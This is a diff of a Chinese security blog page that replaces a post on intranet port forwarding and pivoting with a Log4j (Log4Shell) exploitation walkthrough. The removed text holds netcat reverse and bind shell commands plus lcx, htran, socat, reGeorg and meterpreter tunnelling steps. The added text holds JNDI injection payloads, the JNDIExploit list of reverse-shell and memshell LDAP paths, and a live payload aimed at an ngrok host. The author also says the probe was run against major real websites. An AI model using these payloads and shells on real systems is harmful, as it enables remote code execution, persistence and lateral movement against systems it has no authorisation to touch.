@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>内网渗透之端口转发学习 | 九世的博客</title>
-  <meta name="keywords" content=" 端口转发 ">
-  <meta name="description" content="内网渗透之端口转发学习 | 九世的博客">
+  <title>log4j漏洞复现 | 九世的博客</title>
+  <meta name="keywords" content=" 漏洞复现 ">
+  <meta name="description" content="log4j漏洞复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1898,9 +1898,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-内网渗透之端口转发学习" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-log4j漏洞复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">内网渗透之端口转发学习</h1>
+        <h1 class="article-title">log4j漏洞复现</h1>
     
     <div class="article-meta">
         
@@ -1909,14 +1909,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">端口转发</a>
+            <a href="javascript:" class="color5">漏洞复现</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-09-20 01:59:50">2019-09-20 01:58</time>
+        创建时间:<time class="date" title="更新时间: 2021-12-15 01:09:33">2021-12-15 00:38</time>
         
     </div>
     <div class="article-meta">
@@ -1938,7 +1938,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#内网渗透之端口转发-amp-端口映射"><span class="toc-text">内网渗透之端口转发&amp;端口映射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#两种不同的应用场景"><span class="toc-text">两种不同的应用场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#区分正向与反向连接"><span class="toc-text">区分正向与反向连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#端口转发和代理工具"><span class="toc-text">端口转发和代理工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网常遇见到的状况"><span class="toc-text">内网常遇见到的状况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见操作"><span class="toc-text">常见操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代理"><span class="toc-text">代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#区分正向代理和反向代理"><span class="toc-text">区分正向代理和反向代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reGeorg-Proxychains代理"><span class="toc-text">reGeorg+Proxychains代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#端口转发和代理常用的工具"><span class="toc-text">端口转发和代理常用的工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netsh端口转发"><span class="toc-text">netsh端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socat的使用"><span class="toc-text">socat的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FPipe的使用"><span class="toc-text">FPipe的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#meterpreter中的portfwd"><span class="toc-text">meterpreter中的portfwd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh正向TCP端口加密转发"><span class="toc-text">ssh正向TCP端口加密转发</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞介绍"><span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#前置知识"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1953,246 +1953,108 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-         <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1332052986&auto=1&height=66"></iframe>
+        <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。鉴于此漏洞危害较大，建议客户尽快采取措施防护此漏洞。</p>
+<p>经分析，log4j2是全球使用广泛的java日志框架，同时该漏洞还影响很多全球使用量的Top序列的通用开源组件，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响</p>
+<p><strong>影响版本:Apache Log4j 2.x &lt;= 2.14.1</strong><br><img src="https://static.aichat.net/chat/202112/4a24af97-d778-4b04-a26c-6021a07e000e.png" alt=""></p>
+<p>漏洞利用条件：</p>
+<pre><code>core和api同时调用才可以利用成功，对于lombok这种方式却不行
+</code></pre><p>jdk版本限制<br><img src="https://static.aichat.net/chat/202112/7f779424-3bf0-4c58-9413-a14ea4ef06e8.png" alt=""></p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>181和之前的利用  是ldap-&gt;发送重定向到class-&gt;远程加载class执行</p>
+<p>限制:<br>限制了远程加载class,被限制的版本只能接受ldap的结果,不接受加载远程class</p>
+<p>高版本的绕过：<br>绕过是ldap直接发送调用本地el库执行，不再发送重定向class，不加载远程类，ldap查询还是会发</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>POC</p>
+<pre><code>${jndi:ldap://x.4j2a.dnslog.cn/exp} #有登录框就插，判断是否有回显 （有代表可能可以利用）
+</code></pre><p>当天晚上测试的 （亚马逊，网易云，京东，icound等等）<br><img src="https://static.aichat.net/chat/202112/ef86937d-6b9d-4300-b62f-2f4eafa80090.png" alt=""></p>
+<p><img src="https://static.aichat.net/chat/202112/e8b79e36-ebd7-4485-b4a2-c0ca4ac72fec.png" alt=""></p>
+<p>本地测试环境:JDK_1.8.0_181和JDK_1.8.0_191 | 对应：8u181、8u191<br>Main.java</p>
+<pre><code class="java">package com.company;
 
-<h2 id="内网渗透之端口转发-amp-端口映射"><a href="#内网渗透之端口转发-amp-端口映射" class="headerlink" title="内网渗透之端口转发&amp;端口映射"></a>内网渗透之端口转发&amp;端口映射</h2><p><strong>声明</strong>：此篇文章乃自己看过的文章的总结，文章如下：</p>
-<pre><code>https://xz.aliyun.com/t/6349
-https://mp.weixin.qq.com/s/FNCdKsPwu0_kD-4INn3faQ
-</code></pre><p><strong>端口转发：</strong></p>
-<p>端口转发，有时被叫做隧道，是安全壳为网络安全通信使用的一种方法。端口转发是转发一个网络端口<code>从一个网络端口转发到另一个网络端口或从一个网络节点转发到另一个网络节点的行为</code>，其使一个外部用户从外部经过一个呗激活的NAT路由器到达一个在私有内部IP地址（局域网内网）上的一个端口</p>
-<p>简要说明：端口转发就是将一个端口，这个端口可以本地的端口也可以是访问到任意主机的端口，转发到任意一台可以访问的IP上，通常这个IP是公网IP。</p>
-<p><strong>端口映射</strong></p>
-<p>将内网的端口映射到公网的某个端口，就是将这个端口的流量转发到公网主机上的某个端口。当别人访问这个被转发到公网上的端口，那么公网主机的被转发端口流量将发回给内网主机</p>
-<h2 id="两种不同的应用场景"><a href="#两种不同的应用场景" class="headerlink" title="两种不同的应用场景"></a>两种不同的应用场景</h2><p>端口映射：外网主机A想访问内网主机B上的服务</p>
-<p>端口转发：外网主机A已经可以访问内网主机B里的任意端口，但是无法访问内网主机C上的端口，此时可以将C主机的端口转发到主机B端口，那么外网主机A访问了内网主机B就等于访问了内网主机C</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190912231528-27148446-d570-1.png" alt=""></p>
-<h2 id="区分正向与反向连接"><a href="#区分正向与反向连接" class="headerlink" title="区分正向与反向连接"></a>区分正向与反向连接</h2><ul>
-<li>正向连接：你的机器连接到目标机器</li>
-<li>反向连接：目标机器反连你的机器</li>
-<li>不论映射还是转发，都有正有反，原理相同</li>
-</ul>
-<h2 id="端口转发和代理工具"><a href="#端口转发和代理工具" class="headerlink" title="端口转发和代理工具"></a>端口转发和代理工具</h2><ul>
-<li><p>lcx</p>
-</li>
-<li><p>htran</p>
-</li>
-<li><p>netcat</p>
-<p>…………….</p>
-</li>
-</ul>
-<h2 id="内网常遇见到的状况"><a href="#内网常遇见到的状况" class="headerlink" title="内网常遇见到的状况"></a>内网常遇见到的状况</h2><p>A攻击者</p>
-<p>B内网主机</p>
-<p>C内网主机</p>
-<ul>
-<li>.B能访问外网允许所有端口访问（罕见）</li>
-<li>.B只允许指定端口被访问，其他端口不允许访问</li>
-<li>.B能被A访问，但是C不能被直接访问</li>
-</ul>
-<blockquote>
-<p>1.目标处于网络边界，内外网都可以访问，网络边界主机未安装防火墙，所有端口都对互联网开放，此类业务场景已经极少出现；</p>
-</blockquote>
-<blockquote>
-<p>2.目标处于内网，可以访问外网，但是出口部署的有防火墙策略限制外部网络直接访问内网的敏感端口（3389、22、445等）；</p>
-</blockquote>
-<blockquote>
-<p>3.目标处于内网，不能访问外网，但是可以访问边界主机，防火墙策略限制外部网络直接访问内网的敏感端口（3389、22、445等）。</p>
-</blockquote>
-<h2 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h2><p>环境：受害机内访问外网，允许所有端口被直接访问，攻击机处于外网</p>
-<p>正向反向：反向</p>
-<p>PS:这里的192.168.1.104为攻击机IP</p>
-<p>攻击机执行:</p>
-<pre><code>nc -lvp 4444
-</code></pre><p>受害机执行：</p>
-<pre><code>nc -e cmd 192.168.1.104 4444
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/18/nHXlTI.md.png" alt=""></p>
-<p>环境：受害机内访问外网，允许所有端口被直接访问，攻击机处于内网</p>
-<p>正向反向：正向</p>
-<p>PS:这里的192.168.1.104属于受害机IP</p>
-<p>受害机执行：</p>
-<pre><code>nc -lvp 4444 -e cmd
-</code></pre><p>攻击机执行</p>
-<pre><code>nc 192.168.1.104 4444
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/18/nHjuCV.png" alt=""></p>
-<p>环境：攻击机无法访问内网主机，但内网主机可以访问外网</p>
-<p>IP:192.168.241.155 为内网主机</p>
-<p>IP:192.168.1.104 为外网主机</p>
-<p>内网主机执行:</p>
-<pre><code>lcx -slave [远程IP] [转发到的远程端口] [本机IP] [本机要转发的端口]
-lcx -salve 192.168.1.104 4444 192.168.241.155 3389
-</code></pre><p>外网主机执行</p>
-<pre><code>lcx -listen [监听的端口] [从接收到的数据的端口转发到另外一个端口]
-lcx -listen 4444 5555
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/18/nbS3z6.md.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/09/18/nbpMnS.png" alt=""></p>
-<p>环境：攻击机可以直接访问到内网主机B，但是无法访问内网主机C</p>
-<p>IP:192.168.241.155 为内网主机C</p>
-<p>IP:192.168.241.129 为内网主机B</p>
-<p>IP:192.168.1.104 为攻击机</p>
-<p>在内网主机B执行</p>
-<pre><code>lcx -tran 4444 192.168.241.155 3389
-</code></pre><p>在内网主机b连接本地的4444端口或公网访问192.168.241.129:4444</p>
-<p><img src="https://s2.ax1x.com/2019/09/19/nbCeL8.png" alt=""></p>
-<p>环境：攻击者可以直接访问内网机器B，当防火墙禁止3389连接。内网机器B也可以访问外网</p>
-<p>IP:192.168.69.41 攻击机</p>
-<p>IP:192.168.69.43 内网机器B</p>
-<p>在内网机器B执行</p>
-<pre><code>Htran.exe -tran 4444 127.0.0.1 3389
 
-</code></pre><p>将B的3389转为本地的4444端口</p>
-<p><img src="https://s2.ax1x.com/2019/09/19/nbXNMF.png" alt=""></p>
-<p>方法2：</p>
-<p>攻击机执行</p>
-<pre><code>htran -p -listen 8888 9999
-htran -p -listen [监听本机的8888端口] [将流量转发到本地的9999]
+import java.io.*;
+import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.LogManager;
 
-</code></pre><p>内网主机执行</p>
-<pre><code>htran -p -slave 192.168.69.43 8888 127.0.0.1 3389
-htran -p -slave [攻击机IP] [攻击机所监听的端口] [本机IP] [本机要转发的端口]
 
-</code></pre><p>在攻击机执行：</p>
-<p><img src="https://s2.ax1x.com/2019/09/19/nqMsHJ.png" alt=""></p>
-<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理(Proxy)，也称网络代理，是一种特殊的网络服务，允许一个网端（一般为客户端）通过这个服务与另一个网络断（一般为服务器）进行非直接的连接。一些网关、路由器等网络设备具备网络代理功能。一般认为代理服务有利于保障网络终端的隐私或安全，防止攻击。</p>
-<p><strong>代理的分类</strong></p>
-<ul>
-<li>HTTP代理</li>
-<li>SOCKS代理</li>
-<li>FTP代理</li>
-<li>Telnet代理</li>
-<li>SSL代理</li>
-</ul>
-<h2 id="区分正向代理和反向代理"><a href="#区分正向代理和反向代理" class="headerlink" title="区分正向代理和反向代理"></a>区分正向代理和反向代理</h2><p> 正向代理中，proxy和client同属一个LAN，对Server透明</p>
-<p> 反向代理中，proxy和server同属一个LAN，对Client透明</p>
-<p>一个代理的是客户端一个代理的是服务端</p>
-<p><img src="https://s2.ax1x.com/2019/09/19/nq6ta9.png" alt=""></p>
-<h2 id="reGeorg-Proxychains代理"><a href="#reGeorg-Proxychains代理" class="headerlink" title="reGeorg+Proxychains代理"></a>reGeorg+Proxychains代理</h2><p>reGeorg下载地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
-<p>根据对应的脚本类型将对应的脚本上传到目标机，注意php的要上nosocket.php的。然后访问该php出现<code>Georg says,All seems fine</code>代理成功</p>
-<p><img src="https://s2.ax1x.com/2019/09/19/nqTCPU.png" alt=""></p>
-<p>使用的py2需要安装urllib3模块</p>
-<p>在攻击机执行</p>
-<pre><code class="python">python2 reGorgSocksProxy.py -u http://127.0.0.1:81/gg.php -p 8888
-
+public class Main {
+    public static final Logger logger = LogManager.getLogger(Main.class);
+    public static void main(String[] args) {
+        System.out.println(&quot;Start&quot;);
+        logger.error(&quot;${lower:${jndi:rmi://127.0.0.1:1099/wlzyww}}&quot;);
+    }
+}
 </code></pre>
-<p><img src="https://s2.ax1x.com/2019/09/19/nqLN8K.png" alt=""></p>
-<p>使用Proxifier代理指定的程序，比如我要通过代理来连接目标的3389.那么就设置代理mstsc</p>
-<p>Proxifier下载地址：<a href="http://soft.onlinedown.net/soft/971579.htm" target="_blank" rel="noopener">http://soft.onlinedown.net/soft/971579.htm</a></p>
-<p><strong>PHP必失败</strong></p>
-<p><img src="https://s2.ax1x.com/2019/09/19/nLROaD.png" alt=""></p>
-<p>EW和PS1那个就不测了，EW太老了，没的下载，ps1 powershell杀烂</p>
-<h2 id="端口转发和代理常用的工具"><a href="#端口转发和代理常用的工具" class="headerlink" title="端口转发和代理常用的工具"></a>端口转发和代理常用的工具</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/5hMJDgFiaBZFy90eofTZxGRLeuwqMrKS10zyT5VYyyYMATatyibOIibKKSw9rnObgzJQR9zCxlr18UNLVRSZOOOhg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt=""></p>
-<h2 id="netsh端口转发"><a href="#netsh端口转发" class="headerlink" title="netsh端口转发"></a>netsh端口转发</h2><p>环境：内网主机没部署防火墙，可连接外网，任意端口可连</p>
-<p>IP:192.168.1.104 攻击机</p>
-<p>IP:192.168.241.155 受害机</p>
-<p>在受害机执行</p>
-<pre><code>netsh add v4tov4 listenport=5555 connectaddress=192.168.241.155 connectport=3389
+<p>8u191 ldap可以请求出去，但是无法加载利用<br><img src="https://static.aichat.net/chat/202112/b0e3516e-2431-4652-9bac-693d0f37d3a5.png" alt=""></p>
+<p><img src="https://static.aichat.net/chat/202112/462f6476-bb7b-4791-b9e0-777b681a8767.png" alt=""></p>
+<p>调用栈跟踪：（大哥跟的）<br><img src="https://static.aichat.net/chat/202112/ac71e84a-232b-4af6-b228-f6a2e6af3397.png" alt=""></p>
+<p>致远|用友A8利用log4j getshell<br>JNDIExploit-1.2-SNAPSHOT.jar:<a href="https://github.com/0x727/JNDIExploit" target="_blank" rel="noopener">https://github.com/0x727/JNDIExploit</a></p>
+<pre><code>Supported LADP Queries
+* all words are case INSENSITIVE when send to ldap server
 
-</code></pre><p>然后在外网连接IP:5555</p>
-<p><img src="https://s2.ax1x.com/2019/09/19/nL7E2F.png" alt=""></p>
-<p>netsh查看配置</p>
-<pre><code>netsh interface portproxy dump
 
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nL782D.png" alt=""></p>
-<p>删除命令</p>
-<pre><code>netsh interface portproxy delete v4tov4 listenport=5555
+[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.
+    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]
+    ldap://127.0.0.1:1389/Basic/Command/[cmd]
+    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]
+    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported
+    ldap://127.0.0.1:1389/Basic/TomcatEcho
+    ldap://127.0.0.1:1389/Basic/SpringEcho
+    ldap://127.0.0.1:1389/Basic/WeblogicEcho
+    ldap://127.0.0.1:1389/Basic/TomcatMemshell1
+    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]
+    ldap://127.0.0.1:1389/Basic/JettyMemshell
+    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1
+    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2
+    ldap://127.0.0.1:1389/Basic/JBossMemshell
+    ldap://127.0.0.1:1389/Basic/WebsphereMemshell
+    ldap://127.0.0.1:1389/Basic/SpringMemshell
 
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nL7BPf.png" alt=""></p>
-<h2 id="socat的使用"><a href="#socat的使用" class="headerlink" title="socat的使用"></a>socat的使用</h2><blockquote>
-<p>socat是一个多功能的网络工具，名字来由是” Socket CAT”，可以看作是netcat的N倍加强版。 socat是一个两个独立数据通道之间的双向数据传输的继电器。这些数据通道包含文件、管道、设备（终端或调制解调器等）、插座（Unix，IP4，IP6 - raw，UDP，TCP）、SSL、SOCKS4客户端或代理CONNECT。        socat支持广播和多播、抽象Unix sockets、Linux tun/tap、GNU readline 和 PTY。它提供了分叉、记录和进程间通信的不同模式。多个选项可用于调整socat和其渠道，Socat可以作为TCP中继（一次性或守护进程），作为一个守护进程基于socksifier，作为一个shell Unix套接字接口，作为IP6的继电器，或面向TCP的程序重定向到一个串行线。      socat的主要特点就是在两个数据流之间建立通道；且支持众多协议和链接方式：ip, tcp, udp, ipv6, pipe,exec,system,open,proxy,openssl,socket等。</p>
-<p><strong>工具地址：</strong><a href="http://www.dest-unreach.org/socat" target="_blank" rel="noopener">http://www.dest-unreach.org/socat</a></p>
-</blockquote>
-<p>安装socat</p>
-<pre><code>apt install socat
 
-</code></pre><p>IP:192.168.241.152 kali</p>
-<p>IP:192.168.241.155 windows server 2008</p>
-<p>在kali执行</p>
-<p>PS：监听5555端口的流量然后转发给192.168.241.155:3389端口</p>
-<pre><code>socat TCP4-LISTEM:5555,reuseaddr,fork TCP4:192.168.241.155:3389
+[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
+    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]
+    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
+    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
+    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
+    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho
+    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho
+    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho
+    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1
+    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1
+    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells
 
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nOC4xA.md.png" alt=""></p>
-<p>访问192.168.241.152:5555就可以访问到RDP</p>
-<p><img src="https://s2.ax1x.com/2019/09/19/nOPddf.md.png" alt=""></p>
-<p><strong>Termite</strong></p>
-<blockquote>
-<p>工具在多种操作系统下均有Agent实现，由于代码为标准C实现，所以未来还将有更多的平台被支持。Agent节点可相互连接，进而形成一条树状管理拓扑，依赖该拓扑结构，使用者可实时管理拓扑中的任意主机节点。管理员可通过Admin程序，对拓扑中的任意节点进行管控，包括但不限于文件传输/控制台命令执行/开启远程 SOCKS5 代理服务/远程端口转发等功能。</p>
-</blockquote>
-<p>IP:192.168.241.152 kali</p>
-<p>IP:192.168.241.155 windows server 2008(跳板机)</p>
-<p>IP:192.168.1.104 attack-windows7</p>
-<p>在kali执行</p>
-<pre><code>./agent_Linux64 -l 5555
 
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nOr3b4.md.png" alt=""></p>
-<p>在2008执行</p>
-<pre><code>C:\Users\Administrator\Desktop\Termite&gt;agent_Win32.exe -c 192.168.241.152 -p 555
-5
+[+] TomcatBypass Queries
+    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]
+    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]
+    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]
+    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
+    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho
+    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho
+    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1
+    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]
+    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell
 
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nOrY5R.png" alt=""></p>
-<p>在windows7执行</p>
-<pre><code>H:\端口转发_自己\Termite&gt;admin_Win32.exe -c 192.168.241.152 -p 5555
 
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nOrNP1.png" alt=""></p>
-<p>然后记下kali，2008的ID</p>
-<p><img src="https://s2.ax1x.com/2019/09/19/nOra26.md.png" alt=""></p>
-<p>2008的ID</p>
-<p><img src="https://s2.ax1x.com/2019/09/19/nOrdxK.md.png" alt=""></p>
-<p>然后在attack设置节点2来做为跳板,将192.168.1.1的80端口映射到本机的4444端口</p>
-<pre><code>show #查看节点
-goto 2 #设置节点
-lcxtran 4444 192.198.1.1 80 #映射到本机
+[+] GroovyBypass Queries
+    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]
+    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]
 
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/19/nOrWxf.png" alt=""></p>
-<p>访问127.0.0.1:4444</p>
-<p><img src="https://s2.ax1x.com/2019/09/19/nOr4sS.md.png" alt=""></p>
-<p>wireshark抓到的包</p>
-<p><img src="https://s2.ax1x.com/2019/09/19/nOsSZ4.png" alt=""></p>
-<p>反正我觉得复杂的一批….</p>
-<h2 id="FPipe的使用"><a href="#FPipe的使用" class="headerlink" title="FPipe的使用"></a>FPipe的使用</h2><p>环境：外网主机能访问内网主机B但不能访问内网主机C</p>
-<pre><code>FPipe.exe -l 4444 -r 80 192.168.251.254
-Fpipe.exe -l [转发到本地的端口] -r [被转发的端口] [被转发的IP]
 
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/20/nORSeK.png" alt=""></p>
-<p>访问测试</p>
-<p><img src="https://s2.ax1x.com/2019/09/20/nOR9oD.md.png" alt=""></p>
-<h2 id="meterpreter中的portfwd"><a href="#meterpreter中的portfwd" class="headerlink" title="meterpreter中的portfwd"></a>meterpreter中的portfwd</h2><p>在收到meterpreter中执行portfwd</p>
-<pre><code>portfwd add -l 3388 -r 192.168.241.155 -p 3389
-portfwd add -l [转发到本地的端口] -r [目标的IP] -p [目标的端口]
-
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/20/nORQYQ.png" alt=""></p>
-<p>连接本地的3388</p>
-<p><img src="https://s2.ax1x.com/2019/09/20/nOR0fJ.md.png" alt=""></p>
-<h2 id="ssh正向TCP端口加密转发"><a href="#ssh正向TCP端口加密转发" class="headerlink" title="ssh正向TCP端口加密转发"></a>ssh正向TCP端口加密转发</h2><blockquote>
-<p>又称ssh本地端口转发。 SSH 会自动加密和解密所有SSH 客户端与服务端之间的网络数据。但是，SSH 还能够将其他TCP 端口的网络数据通过SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做“隧道”（tunneling），这是因为SSH 为其他TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境中的防火墙限制了一些网络端口的使用，但是允许SSH 的连接，也能够通过将TCP 端口转发来使用SSH 进行通讯。</p>
-</blockquote>
-<p>修改/etc/sshd_config</p>
-<pre><code>AllowTcpForwarding yes
-GatewayPorts yes
-TCPKeepAlive yes 保持心跳,防止 ssh 断开
-PasswordAuthentication yes
-PermitRootLogin yes
-
-</code></pre><p>命令原型</p>
-<pre><code>ssh -CfNg -L 8080:127.0.0.1:2222 user@ip //VPS 本地访问VPS:8080就是内网的22端口
--C：该参数将使ssh压缩所有通过Secure Shell客户端发送的数据，包括输入、输出、错误消息及转发数据。它使用gzip算法，压缩级别可通过设置配制文件中的参数Compressicn Level来指定。这对于缓慢的传输线路特别有用的。但对于传输速度已经很快的网络则显得没有必要。同样，你可以利用配制文件针对每台主机配置这个参数。 
--f：该参数将ssh连接送入后台执行。这在验证已经完成且TCP/IP转发已经建立的情况下会生效。这对在远程主机上启动X程序显得十分重要。其后用户将被提示要求输入口令(提供的认证代理不运行)，然后将连接送往后台。 
--g：该参数允许远程主机通过端口转发与主机端口相连，通常情况下仅允许本地主机这样做。 
--N：不执行远程指令。 
--R：远程转发
--L：本地转发
--D：动态转发，即socks代理
--p：指定远程ssh服务端口
--n：后台运行
--p：安静模式，不要显示任何debug信息
-
-</code></pre><p>然后执行</p>
-<pre><code>service ssh start或service ssh restart
-ssh -CfNg -L [本地端口]:[被转发的IP]:[被转发的端口] [ssh用户]@[IP]
-ssh -CfNg -L 4444:192.168.241.155:3389 root@192.168.241.152
-
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/20/nOW4ET.md.png" alt=""></p>
-<p>连接本地的4444端口</p>
-<p><img src="https://s2.ax1x.com/2019/09/20/nOW5UU.png" alt=""></p>
-<p>在说一遍：</p>
-<p><strong>此篇文章乃自己看过的文章的总结</strong></p>
+[+] WebsphereBypass Queries
+    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]
+    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]
+    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]
+    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]
+    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
+    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell
+    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
+</code></pre><p>VPS/本地+ngrok<br><img src="https://static.aichat.net/chat/202112/3535500d-616d-4383-a347-de618310fe6e.png" alt=""></p>
+<p>登录框插</p>
+<pre><code>${jndi:ldap://4.tcp.ngrok.io:14296/Basic/TomcatMemshell2}
+</code></pre><p><img src="https://static.aichat.net/chat/202112/6deb3459-2646-40ed-a98a-3af3f92410c4.png" alt=""></p>
+<p><img src="https://static.aichat.net/chat/202112/6d7d8566-f28f-4d38-879e-989199721561.png" alt=""></p>
+<p>现存在问题:有些不行但是ldap能请求出来(一般是版本不行,不会bypass)</p>
+<p>上线shellcode<br>将java执行shellcode编译为class，配合marshalsec即可<br><img src="https://static.aichat.net/chat/202112/63710e6a-a42e-494d-a297-b01aa2b25345.png" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://help.aliyun.com/noticelist/articleid/1060971232.html" target="_blank" rel="noopener">https://help.aliyun.com/noticelist/articleid/1060971232.html</a><br><a href="https://mp.weixin.qq.com/s/l7iclJRegADs3oiEdcgAvQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/l7iclJRegADs3oiEdcgAvQ</a><br><a href="https://mp.weixin.qq.com/s/15zcLEk6_x2enszhim9afA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/15zcLEk6_x2enszhim9afA</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2202,12 +2064,12 @@ ssh -CfNg -L 4444:192.168.241.155:3389 root@192.168.241.152
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>内网渗透之端口转发学习</p>
